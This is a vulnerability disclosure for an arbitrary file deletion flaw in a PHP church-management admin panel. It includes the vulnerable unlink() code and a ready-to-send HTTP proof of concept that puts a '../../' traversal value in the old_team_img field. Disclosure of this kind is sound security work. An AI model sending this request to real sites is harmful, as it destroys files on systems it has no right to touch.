### Vulnerability file address

In line 480 of `church/admin/app/web_crud.php`, `@unlink("../../assets/images/" . $_POST['old_team_img']);`,` $_POST['old_team_img']` parameters have not been restricted, which causes any file to be deleted

```php
if ($_FILES['teamphoto']['tmp_name'] != '') {
            $filepath = "../../assets/images/" . generateUniqueFileName($_FILES["teamphoto"]["name"]);

            if (move_uploaded_file($_FILES["teamphoto"]["tmp_name"], $filepath)) {
                $img11 = basename($filepath);
                @unlink("../../assets/images/" . $_POST['old_team_img']);
            }
        }
```

### POC

```http
POST /church/admin/app/web_crud.php HTTP/1.1
Host: www.church.net
Connection: close
Cookie: PHPSESSID=hl5noegsdjn1ru7skoi8tmqco3
Upgrade-Insecure-Requests: 1
Content-Type: multipart/form-data; boundary=----WebKitFormBoundaryTZGvWJmfBtMK9O8p
Content-Length: 375

------WebKitFormBoundaryTZGvWJmfBtMK9O8p
Content-Disposition: form-data; name="update6"

1
------WebKitFormBoundaryTZGvWJmfBtMK9O8p
Content-Disposition: form-data; name="old_team_img"

../../22.txt
------WebKitFormBoundaryTZGvWJmfBtMK9O8p
Content-Disposition: form-data; name="teamphoto";filename="aaa.php"

this is test
------WebKitFormBoundaryTZGvWJmfBtMK9O8p--
```

### Attack results pictures

First, we create a `22.txt` file in the `church/` directory

![image-20250505170403605](https://raw.githubusercontent.com/Amyppp/imgs/main/vuln/202505051704645.png)



Then we execute the above poc to attack

![image-20250505170634642](https://raw.githubusercontent.com/Amyppp/imgs/main/vuln/202505051706671.png)



Files are deleted after the attack is successful

![image-20250505170645586](https://raw.githubusercontent.com/Amyppp/imgs/main/vuln/202505051706627.png)